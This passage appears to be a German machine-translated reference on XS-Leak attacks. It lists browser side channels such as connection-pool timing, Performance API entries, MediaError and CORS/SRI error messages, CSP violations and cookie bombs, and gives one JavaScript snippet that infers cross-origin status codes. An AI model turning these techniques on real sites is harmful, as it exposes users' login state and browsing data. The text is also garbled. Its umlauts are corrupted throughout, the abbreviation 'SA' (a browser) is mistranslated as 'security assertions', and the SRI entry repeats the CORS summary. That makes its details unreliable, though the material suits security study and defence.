4. Versuchen Sie eine 257. Anfrage an einen anderen Host. Da alle Sockets in Verwendung sind (gem√§√ü den Schritten 2 und 3), wird diese Anfrage in die Warteschlange gestellt, bis ein Socket verf√ºgbar wird. Die Verz√∂gerung, bevor diese Anfrage fortgesetzt wird, gibt dem Angreifer zeitliche Informationen √ºber die Netzwerkaktivit√§t, die mit dem 256. Socket (dem Socket der Zielseite) verbunden ist. Diese Ableitung ist m√∂glich, weil die 255 Sockets aus Schritt 2 weiterhin besch√§ftigt sind, was bedeutet, dass jeder neu verf√ºgbare Socket derjenige sein muss, der aus Schritt 3 freigegeben wurde. Die Zeit, die ben√∂tigt wird, damit der 256. Socket verf√ºgbar wird, ist somit direkt mit der Zeit verbunden, die ben√∂tigt wird, um die Anfrage an die Zielseite abzuschlie√üen.

F√ºr weitere Informationen: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)

### Verbindungs-Pool nach Ziel

* **Inclusion Methods**: JavaScript-Anfragen
* **Detectable Difference**: Timing (allgemein aufgrund von Seiteninhalt, Statuscode)
* **More info**:
* **Summary:** Es ist wie die vorherige Technik, aber anstatt alle Sockets zu verwenden, setzt Google **Chrome** ein Limit von **6 gleichzeitigen Anfragen an denselben Ursprung**. Wenn wir **5 blockieren** und dann eine **6.** Anfrage starten, k√∂nnen wir sie **zeitlich messen**. Wenn es uns gelingt, die **Opferseite dazu zu bringen,** mehr **Anfragen** an denselben Endpunkt zu senden, um einen **Status** der **Seite** zu erkennen, wird die **6. Anfrage** **l√§nger** dauern und wir k√∂nnen dies erkennen.

## Performance-API-Techniken

Die [`Performance API`](https://developer.mozilla.org/en-US/docs/Web/API/Performance) bietet Einblicke in die Leistungskennzahlen von Webanwendungen, die durch die [`Resource Timing API`](https://developer.mozilla.org/en-US/docs/Web/API/Resource\_Timing\_API) weiter bereichert werden. Die Resource Timing API erm√∂glicht die √úberwachung detaillierter Netzwerk-Anfragezeiten, wie z. B. die Dauer der Anfragen. Wenn Server den Header `Timing-Allow-Origin: *` in ihren Antworten einf√ºgen, werden zus√§tzliche Daten wie die √úbertragungsgr√∂√üe und die Domain-Lookup-Zeit verf√ºgbar.

Diese F√ºlle von Daten kann √ºber Methoden wie [`performance.getEntries`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntries) oder [`performance.getEntriesByName`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntriesByName) abgerufen werden, die einen umfassenden √úberblick √ºber leistungsbezogene Informationen bieten. Dar√ºber hinaus erm√∂glicht die API die Messung von Ausf√ºhrungszeiten, indem die Differenz zwischen Zeitstempeln berechnet wird, die von [`performance.now()`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) erhalten werden. Es ist jedoch zu beachten, dass die Pr√§zision von `performance.now()` in bestimmten Browsern wie Chrome auf Millisekunden beschr√§nkt sein kann, was die Granularit√§t der Zeitmessungen beeintr√§chtigen k√∂nnte.

Neben Zeitmessungen kann die Performance-API auch f√ºr sicherheitsrelevante Einblicke genutzt werden. Beispielsweise kann das Vorhandensein oder Fehlen von Seiten im `performance`-Objekt in Chrome auf die Anwendung von `X-Frame-Options` hinweisen. Insbesondere wird eine Seite, die aufgrund von `X-Frame-Options` daran gehindert wird, in einem Frame gerendert zu werden, nicht im `performance`-Objekt aufgezeichnet, was einen subtilen Hinweis auf die Rahmenrichtlinien der Seite gibt.

### Fehler-Leak

* **Inclusion Methods**: Frames, HTML-Elemente
* **Detectable Difference**: Statuscode
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Eine Anfrage, die zu Fehlern f√ºhrt, erstellt keinen Ressourcenzeitmessungseintrag.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Error%20Leak](https://xsinator.com/testing.html#Performance%20API%20Error%20Leak)

Es ist m√∂glich, **zwischen HTTP-Antwortstatuscodes zu unterscheiden**, da Anfragen, die zu einem **Fehler** f√ºhren, **keinen Leistungseintrag** erstellen.

### Stil-Neuladefehler

* **Inclusion Methods**: HTML-Elemente
* **Detectable Difference**: Statuscode
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Aufgrund eines Browserfehlers werden Anfragen, die zu Fehlern f√ºhren, zweimal geladen.
* **Code Example**: [https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak](https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak)

In der vorherigen Technik wurden auch zwei F√§lle identifiziert, in denen Browserfehler in GC dazu f√ºhren, dass **Ressourcen zweimal geladen werden, wenn sie nicht geladen werden k√∂nnen**. Dies f√ºhrt zu mehreren Eintr√§gen in der Performance-API und kann somit erkannt werden.

### Anfrage-Zusammenf√ºhrungsfehler

* **Inclusion Methods**: HTML-Elemente
* **Detectable Difference**: Statuscode
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Anfragen, die zu einem Fehler f√ºhren, k√∂nnen nicht zusammengef√ºhrt werden.
* **Code Example**: [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

Die Technik wurde in einer Tabelle in dem erw√§hnten Papier gefunden, aber es wurde keine Beschreibung der Technik gefunden. Sie k√∂nnen jedoch den Quellcode √ºberpr√ºfen, um danach zu suchen unter [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

### Leere Seiten-Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Seiteninhalt
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Leere Antworten erstellen keine Ressourcenzeitmessungseintr√§ge.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak](https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak)

Ein Angreifer kann erkennen, ob eine Anfrage zu einem leeren HTTP-Antwortk√∂rper gef√ºhrt hat, da **leere Seiten in einigen Browsern keinen Leistungseintrag erstellen**.

### **XSS-Auditor-Leak**

* **Inclusion Methods**: Frames
* **Detectable Difference**: Seiteninhalt
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Durch die Verwendung des XSS-Auditors in Sicherheitsbehauptungen k√∂nnen Angreifer bestimmte Elemente von Webseiten erkennen, indem sie √Ñnderungen in den Antworten beobachten, wenn gestaltete Payloads den Filtermechanismus des Auditors ausl√∂sen.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak](https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak)

In Sicherheitsbehauptungen (SA) kann der XSS-Auditor, der urspr√ºnglich zur Verhinderung von Cross-Site-Scripting (XSS)-Angriffen gedacht war, paradoxerweise ausgenutzt werden, um sensible Informationen zu leaken. Obwohl dieses integrierte Feature aus Google Chrome (GC) entfernt wurde, ist es immer noch in SA vorhanden. 2013 zeigten Braun und Heiderich, dass der XSS-Auditor versehentlich legitime Skripte blockieren konnte, was zu falsch positiven Ergebnissen f√ºhrte. Auf dieser Grundlage entwickelten Forscher Techniken, um Informationen zu extrahieren und spezifische Inhalte auf Cross-Origin-Seiten zu erkennen, ein Konzept, das als XS-Leaks bekannt ist und urspr√ºnglich von Terada berichtet und von Heyes in einem Blogbeitrag ausgef√ºhrt wurde. Obwohl diese Techniken spezifisch f√ºr den XSS-Auditor in GC waren, wurde festgestellt, dass in SA Seiten, die vom XSS-Auditor blockiert werden, keine Eintr√§ge in der Performance-API generieren, was eine Methode offenbart, durch die sensible Informationen m√∂glicherweise weiterhin geleakt werden k√∂nnten.

### X-Frame-Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Header
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2), [https://xsleaks.github.io/xsleaks/examples/x-frame/index.html](https://xsleaks.github.io/xsleaks/examples/x-frame/index.html), [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options)
* **Summary:** Ressourcen mit dem X-Frame-Options-Header erstellen keinen Ressourcenzeitmessungseintrag.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak](https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak)

Wenn eine Seite **nicht erlaubt ist**, in einem **iframe** **gerendert** zu werden, erstellt sie **keinen Leistungseintrag**. Infolgedessen kann ein Angreifer den Antwortheader **`X-Frame-Options`** erkennen.\
Das Gleiche passiert, wenn Sie ein **embed**-Tag verwenden.

### Download-Erkennung

* **Inclusion Methods**: Frames
* **Detectable Difference**: Header
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Downloads erstellen keine Ressourcenzeitmessungseintr√§ge in der Performance-API.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Download%20Detection](https://xsinator.com/testing.html#Performance%20API%20Download%20Detection)

√Ñhnlich wie beim beschriebenen XS-Leak erstellt eine **Ressource, die heruntergeladen wird**, aufgrund des ContentDisposition-Headers ebenfalls **keinen Leistungseintrag**. Diese Technik funktioniert in allen g√§ngigen Browsern.

### Weiterleitungsstart-Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Weiterleitung
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Der Ressourcenzeitmessungseintrag leakt die Startzeit einer Weiterleitung.
* **Code Example**: [https://xsinator.com/testing.html#Redirect%20Start%20Leak](https://xsinator.com/testing.html#Redirect%20Start%20Leak)

Wir fanden einen XS-Leak-Fall, der das Verhalten einiger Browser ausnutzt, die zu viele Informationen f√ºr Cross-Origin-Anfragen protokollieren. Der Standard definiert eine Teilmenge von Attributen, die f√ºr Cross-Origin-Ressourcen auf null gesetzt werden sollten. In **SA** ist es jedoch m√∂glich zu erkennen, ob der Benutzer von der Zielseite **weitergeleitet** wird, indem die **Performance-API** abgefragt und die **redirectStart-Zeitdaten** √ºberpr√ºft werden.

### Dauer-Weiterleitungs-Leak

* **Inclusion Methods**: Fetch-API
* **Detectable Difference**: Weiterleitung
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Die Dauer der Zeitmessungseintr√§ge ist negativ, wenn eine Weiterleitung erfolgt.
* **Code Example**: [https://xsinator.com/testing.html#Duration%20Redirect%20Leak](https://xsinator.com/testing.html#Duration%20Redirect%20Leak)

In GC ist die **Dauer** f√ºr Anfragen, die zu einer **Weiterleitung** f√ºhren, **negativ** und kann somit von Anfragen, die nicht zu einer Weiterleitung f√ºhren, **unterschieden** werden.

### CORP-Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Header
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Ressourcen, die durch CORP gesch√ºtzt sind, erstellen keine Ressourcenzeitmessungseintr√§ge.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak](https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak)

In einigen F√§llen kann der **nextHopProtocol-Eintrag** als Leak-Technik verwendet werden. In GC, wenn der **CORP-Header** gesetzt ist, wird der nextHopProtocol **leer** sein. Beachten Sie, dass SA f√ºr CORP-aktivierte Ressourcen √ºberhaupt keinen Leistungseintrag erstellt.

### Service Worker

* **Inclusion Methods**: Frames
* **Detectable Difference**: API-Nutzung
* **More info**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
* **Summary:** Erkennen, ob ein Service Worker f√ºr einen bestimmten Ursprung registriert ist.
* **Code Example**:

Service Worker sind ereignisgesteuerte Skriptkontexte, die an einem Ursprung ausgef√ºhrt werden. Sie laufen im Hintergrund einer Webseite und k√∂nnen Ressourcen abfangen, √§ndern und **cachen**, um Offline-Webanwendungen zu erstellen.\
Wenn eine **Ressource, die von einem Service Worker** zwischengespeichert wurde, √ºber ein **iframe** aufgerufen wird, wird die Ressource **aus dem Cache des Service Workers** geladen.\
Um zu erkennen, ob die Ressource **aus dem Cache des Service Workers** geladen wurde, kann die **Performance-API** verwendet werden.\
Dies k√∂nnte auch mit einem Timing-Angriff durchgef√ºhrt werden (siehe das Papier f√ºr weitere Informationen).

### Cache

* **Inclusion Methods**: Fetch-API
* **Detectable Difference**: Timing
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
* **Summary:** Es ist m√∂glich zu √ºberpr√ºfen, ob eine Ressource im Cache gespeichert wurde.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](https://xsinator.com/testing.html#Cache%20Leak%20\(POST\))

Mit der [Performance-API](xs-search.md#performance-api) ist es m√∂glich zu √ºberpr√ºfen, ob eine Ressource zwischengespeichert ist.

### Netzwerkdauer

* **Inclusion Methods**: Fetch-API
* **Detectable Difference**: Seiteninhalt
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)
* **Summary:** Es ist m√∂glich, die Netzwerkdauer einer Anfrage aus der `performance`-API abzurufen.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)

## Fehlernachrichtentechnik

### Medienfehler

* **Inclusion Methods**: HTML-Elemente (Video, Audio)
* **Detectable Difference**: Statuscode
* **More info**: [https://bugs.chromium.org/p/chromium/issues/detail?id=828265](https://bugs.chromium.org/p/chromium/issues/detail?id=828265)
* **Summary:** In Firefox ist es m√∂glich, den Statuscode einer Cross-Origin-Anfrage genau zu leaken.
* **Code Example**: [https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false);
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg;
}

function startup() {
let audioElement = document.getElementById("audio");
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener("click", function() {
audioElement.src = document.getElementById("testUrl").value;
}, false);
// Create the event handler
var errHandler = function() {
let err = this.error;
let message = err.message;
let status = "";

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if((message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1) || (message.indexOf("Failed to init decoder") != -1)){
status = "Success";
}else{
status = "Error";
}
displayErrorMessage("<strong>Status: " + status + "</strong> (Error code:" + err.code + " / Error Message: " + err.message + ")<br>");
};
audioElement.onerror = errHandler;
}
```
Die `MediaError`-Schnittstelle hat eine Nachrichten-Eigenschaft, die Ressourcen eindeutig identifiziert, die erfolgreich mit einem bestimmten String geladen werden. Ein Angreifer kann diese Funktion ausnutzen, indem er den Inhalt der Nachricht beobachtet und so den Antwortstatus einer Cross-Origin-Ressource ableitet.

### CORS-Fehler

* **Inklusionsmethoden**: Fetch API
* **Erkennbare Unterschiede**: Header
* **Weitere Informationen**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Zusammenfassung:** In Sicherheitsbehauptungen (SA) geben CORS-Fehlermeldungen unbeabsichtigt die vollst√§ndige URL von umgeleiteten Anfragen preis.
* **Codebeispiel**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

Diese Technik erm√∂glicht es einem Angreifer, **das Ziel einer Umleitung einer Cross-Origin-Website zu extrahieren**, indem er ausnutzt, wie Webkit-basierte Browser CORS-Anfragen behandeln. Insbesondere wenn eine **CORS-aktivierte Anfrage** an eine Zielseite gesendet wird, die eine Umleitung basierend auf dem Benutzerstatus ausgibt, und der Browser die Anfrage anschlie√üend ablehnt, wird die **vollst√§ndige URL des Ziels der Umleitung** in der Fehlermeldung offengelegt. Diese Schwachstelle offenbart nicht nur die Tatsache der Umleitung, sondern gibt auch den Endpunkt der Umleitung und alle **sensiblen Abfrageparameter** preis, die sie enthalten kann.

### SRI-Fehler

* **Inklusionsmethoden**: Fetch API
* **Erkennbare Unterschiede**: Header
* **Weitere Informationen**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Zusammenfassung:** In Sicherheitsbehauptungen (SA) geben CORS-Fehlermeldungen unbeabsichtigt die vollst√§ndige URL von umgeleiteten Anfragen preis.
* **Codebeispiel**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

Ein Angreifer kann **ausf√ºhrliche Fehlermeldungen** ausnutzen, um die Gr√∂√üe von Cross-Origin-Antworten abzuleiten. Dies ist m√∂glich aufgrund des Mechanismus der Subresource Integrity (SRI), der das Integrit√§tsattribut verwendet, um zu validieren, dass abgerufene Ressourcen, oft von CDNs, nicht manipuliert wurden. Damit SRI bei Cross-Origin-Ressourcen funktioniert, m√ºssen diese **CORS-aktiviert** sein; andernfalls unterliegen sie keinen Integrit√§tspr√ºfungen. In Sicherheitsbehauptungen (SA) kann, √§hnlich wie beim CORS-Fehler XS-Leak, eine Fehlermeldung erfasst werden, nachdem eine Fetch-Anfrage mit einem Integrit√§tsattribut fehlschl√§gt. Angreifer k√∂nnen absichtlich **diesen Fehler ausl√∂sen**, indem sie einen **falschen Hashwert** dem Integrit√§tsattribut einer beliebigen Anfrage zuweisen. In SA offenbart die resultierende Fehlermeldung unbeabsichtigt die Inhaltsl√§nge der angeforderten Ressource. Diese Informationsleckage erm√∂glicht es einem Angreifer, Variationen in der Antwortgr√∂√üe zu erkennen, was den Weg f√ºr ausgekl√ºgelte XS-Leak-Angriffe ebnet.

### CSP-Verletzung/Erkennung

* **Inklusionsmethoden**: Pop-ups
* **Erkennbare Unterschiede**: Statuscode
* **Weitere Informationen**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
* **Zusammenfassung:** Wenn nur die Website des Opfers in der CSP erlaubt ist und wir versuchen, zu einer anderen Domain umzuleiten, wird die CSP einen erkennbaren Fehler ausl√∂sen.
* **Codebeispiel**: [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

Ein XS-Leak kann die CSP verwenden, um zu erkennen, ob eine Cross-Origin-Website zu einem anderen Ursprung umgeleitet wurde. Dieses Leck kann die Umleitung erkennen, aber zus√§tzlich wird die Domain des Umleitungsziels offengelegt. Die Grundidee dieses Angriffs besteht darin, **die Ziel-Domain auf der Angreifer-Website zuzulassen**. Sobald eine Anfrage an die Ziel-Domain gesendet wird, **leitet sie** zu einer Cross-Origin-Domain um. **CSP blockiert** den Zugriff darauf und erstellt einen **Verletzungsbericht, der als Leak-Technik verwendet wird**. Je nach Browser **kann dieser Bericht den Zielort der Umleitung offenbaren**.\
Moderne Browser zeigen nicht die URL an, zu der umgeleitet wurde, aber man kann dennoch erkennen, dass eine Cross-Origin-Umleitung ausgel√∂st wurde.

### Cache

* **Inklusionsmethoden**: Frames, Pop-ups
* **Erkennbare Unterschiede**: Seiteninhalt
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
* **Zusammenfassung:** L√∂schen Sie die Datei aus dem Cache. √ñffnet die Zielseite und √ºberpr√ºft, ob die Datei im Cache vorhanden ist.
* **Codebeispiel:**

Browser k√∂nnten einen gemeinsamen Cache f√ºr alle Websites verwenden. Unabh√§ngig von ihrem Ursprung ist es m√∂glich zu deduzieren, ob eine Zielseite **eine bestimmte Datei angefordert hat**.

Wenn eine Seite ein Bild nur l√§dt, wenn der Benutzer angemeldet ist, k√∂nnen Sie die **Ressource ung√ºltig machen** (damit sie nicht mehr im Cache ist, siehe weitere Informationslinks), **eine Anfrage durchf√ºhren**, die diese Ressource laden k√∂nnte, und versuchen, die Ressource **mit einer fehlerhaften Anfrage** zu laden (z. B. mit einem zu langen Referer-Header). Wenn das Laden der Ressource **keinen Fehler ausgel√∂st hat**, liegt es daran, dass sie **im Cache war**.

### CSP-Direktive

* **Inklusionsmethoden**: Frames
* **Erkennbare Unterschiede**: Header
* **Weitere Informationen**: [https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
* **Zusammenfassung:** CSP-Header-Direktiven k√∂nnen mit dem CSP-iFrame-Attribut abgefragt werden, wodurch Richtliniendetails offengelegt werden.
* **Codebeispiel**: [https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

Eine neuartige Funktion in Google Chrome (GC) erm√∂glicht es Webseiten, eine **Content Security Policy (CSP)** vorzuschlagen, indem sie ein Attribut auf einem iFrame-Element festlegen, wobei die Richtliniendirektiven zusammen mit der HTTP-Anfrage √ºbertragen werden. Normalerweise muss der eingebettete Inhalt **dies √ºber einen HTTP-Header autorisieren**, oder es wird eine **Fehlerseite angezeigt**. Wenn das iFrame jedoch bereits durch eine CSP geregelt ist und die neu vorgeschlagene Richtlinie nicht restriktiver ist, wird die Seite normal geladen. Dieser Mechanismus er√∂ffnet einem Angreifer die M√∂glichkeit, **spezifische CSP-Direktiven** einer Cross-Origin-Seite zu erkennen, indem er die Fehlerseite identifiziert. Obwohl diese Schwachstelle als behoben markiert wurde, zeigen unsere Erkenntnisse eine **neue Leak-Technik**, die in der Lage ist, die Fehlerseite zu erkennen, was darauf hindeutet, dass das zugrunde liegende Problem nie vollst√§ndig behoben wurde.

### **CORP**

* **Inklusionsmethoden**: Fetch API
* **Erkennbare Unterschiede**: Header
* **Weitere Informationen**: [**https://xsleaks.dev/docs/attacks/browser-features/corp/**](https://xsleaks.dev/docs/attacks/browser-features/corp/)
* **Zusammenfassung:** Ressourcen, die mit der Cross-Origin Resource Policy (CORP) gesichert sind, werfen einen Fehler, wenn sie von einem nicht erlaubten Ursprung abgerufen werden.
* **Codebeispiel**: [https://xsinator.com/testing.html#CORP%20Leak](https://xsinator.com/testing.html#CORP%20Leak)

Der CORP-Header ist ein relativ neues Sicherheitsmerkmal der Webplattform, das, wenn es gesetzt ist, **Cross-Origin-Anfragen ohne CORS zu der angegebenen Ressource blockiert**. Das Vorhandensein des Headers kann erkannt werden, da eine durch CORP gesch√ºtzte Ressource **einen Fehler ausl√∂st, wenn sie abgerufen wird**.

### CORB

* **Inklusionsmethoden**: HTML-Elemente
* **Erkennbare Unterschiede**: Header
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
* **Zusammenfassung**: CORB kann Angreifern erm√∂glichen zu erkennen, wann der **`nosniff`-Header im Request vorhanden ist**.
* **Codebeispiel**: [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

√úberpr√ºfen Sie den Link f√ºr weitere Informationen √ºber den Angriff.

### CORS-Fehler bei falscher Ursprungsspiegelung <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

* **Inklusionsmethoden**: Fetch API
* **Erkennbare Unterschiede**: Header
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
* **Zusammenfassung**: Wenn der Origin-Header im Header `Access-Control-Allow-Origin` gespiegelt wird, ist es m√∂glich zu √ºberpr√ºfen, ob eine Ressource bereits im Cache ist.
* **Codebeispiel**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

Falls der **Origin-Header** im Header `Access-Control-Allow-Origin` **gespiegelt** wird, kann ein Angreifer dieses Verhalten ausnutzen, um zu versuchen, die **Ressource** im **CORS**-Modus abzurufen. Wenn ein **Fehler** **nicht** ausgel√∂st wird, bedeutet das, dass sie **korrekt vom Web abgerufen wurde**, wenn ein Fehler **ausgel√∂st wird**, liegt es daran, dass sie **aus dem Cache abgerufen wurde** (der Fehler tritt auf, weil der Cache eine Antwort mit einem CORS-Header speichert, der die urspr√ºngliche Domain und nicht die Domain des Angreifers erlaubt).\
Beachten Sie, dass dies nicht funktioniert, wenn der Ursprung nicht gespiegelt wird, aber ein Platzhalter verwendet wird (`Access-Control-Allow-Origin: *`).

## Lesbare Attributtechnik

### Fetch-Umleitung

* **Inklusionsmethoden**: Fetch API
* **Erkennbare Unterschiede**: Statuscode
* **Weitere Informationen**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
* **Zusammenfassung:** GC und SA erm√∂glichen es, den Typ der Antwort (opaque-redirect) zu √ºberpr√ºfen, nachdem die Umleitung abgeschlossen ist.
* **Codebeispiel**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

Durch das Einreichen einer Anfrage mit der Fetch API mit `redirect: "manual"` und anderen Parametern ist es m√∂glich, das Attribut `response.type` zu lesen, und wenn es gleich `opaqueredirect` ist, war die Antwort eine Umleitung.

### COOP

* **Inklusionsmethoden**: Pop-ups
* **Erkennbare Unterschiede**: Header
* **Weitere Informationen**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
* **Zusammenfassung:** Seiten, die durch die Cross-Origin Opener Policy (COOP) gesch√ºtzt sind, verhindern den Zugriff von Cross-Origin-Interaktionen.
* **Codebeispiel**: [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

Ein Angreifer kann das Vorhandensein des Cross-Origin Opener Policy (COOP)-Headers in einer Cross-Origin-HTTP-Antwort ableiten. COOP wird von Webanwendungen verwendet, um externe Seiten daran zu hindern, beliebige Fensterreferenzen zu erhalten. Die Sichtbarkeit dieses Headers kann erkannt werden, indem versucht wird, auf die **`contentWindow`-Referenz** zuzugreifen. In Szenarien, in denen COOP bedingt angewendet wird, wird die **`opener`-Eigenschaft** zu einem eindeutigen Indikator: Sie ist **undefiniert**, wenn COOP aktiv ist, und **definiert** in dessen Abwesenheit.

### URL-Maximal-L√§nge - Serverseite

* **Inklusionsmethoden**: Fetch API, HTML-Elemente
* **Erkennbare Unterschiede**: Statuscode / Inhalt
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
* **Zusammenfassung:** Unterschiede in den Antworten erkennen, weil die L√§nge der Umleitungsantwort m√∂glicherweise zu gro√ü ist, sodass der Server mit einem Fehler antwortet und ein Alarm ausgel√∂st wird.
* **Codebeispiel**: [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

Wenn eine serverseitige Umleitung **Benutzereingaben innerhalb der Umleitung** und **zus√§tzliche Daten** verwendet. Es ist m√∂glich, dieses Verhalten zu erkennen, da **Server** normalerweise eine **L√§ngenbeschr√§nkung f√ºr Anfragen** haben. Wenn die **Benutzerdaten** diese **L√§nge - 1** haben, weil die **Umleitung** **diese Daten** verwendet und **etwas zus√§tzliches hinzuf√ºgt**, wird ein **Fehler ausgel√∂st, der √ºber Fehlerereignisse erkennbar ist**.

Wenn Sie irgendwie Cookies f√ºr einen Benutzer setzen k√∂nnen, k√∂nnen Sie diesen Angriff auch durchf√ºhren, indem Sie **genug Cookies setzen** ([**Cookie-Bombe**](hacking-with-cookies/cookie-bomb.md)), sodass mit der **erh√∂hten Gr√∂√üe der Antwort** der **korrekten Antwort** ein **Fehler** ausgel√∂st wird. In diesem Fall denken Sie daran, dass, wenn Sie diese Anfrage von einer gleichen Seite aus ausl√∂sen, `<script>` automatisch die Cookies sendet (damit Sie nach Fehlern suchen k√∂nnen).\
